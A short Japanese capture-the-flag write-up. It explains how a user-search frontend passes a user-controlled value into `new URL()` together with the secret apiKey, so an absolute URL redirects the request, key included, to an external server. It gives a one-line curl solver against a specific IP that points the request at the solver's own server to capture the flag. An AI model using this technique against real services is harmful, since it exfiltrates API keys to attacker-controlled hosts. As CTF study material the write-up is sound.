# 解説
frontend.tsがクライアントで，user-search.tsがサーバー側で、サーバーはユーザー検索を行うAPIを提供しており、apikeyで認証を行っており、apikeyがFLAGなので、このapikeyを取得するのが目的。
frontend.tsで我々の入力したuserというクエリ文字列の名前を検索するリクエスト(apikeyを含む)をサーバー(user-search.ts)に送られるようになっており、この通信に注目するとよい。

# solver
```
curl 'http://35.194.136.248:3000/search?user={自身の管理するサーバーのURL}'
```

user変数に外部のサーバーのURLを入れてしまうと、リクエストがその外部のURLに飛んでしまい、そのリクエストに$FLAGが入っているので、自分の管理する外部サーバーのログを見ると，FLAGの入ったリクエストを見ることができると思います。

# 脆弱性のある箇所
- frontend.ts
$\{user\}にURLを入れるとそこにFLAGごとリクエストが飛ぶ
```
const uri = new URL(`${user}?apiKey=${FLAG}`, userSearchAPI);
```

# 感想
蛇足ですが、僕はSAORIとIROHAが好き
ペロロは...まぁ、可愛いですよね
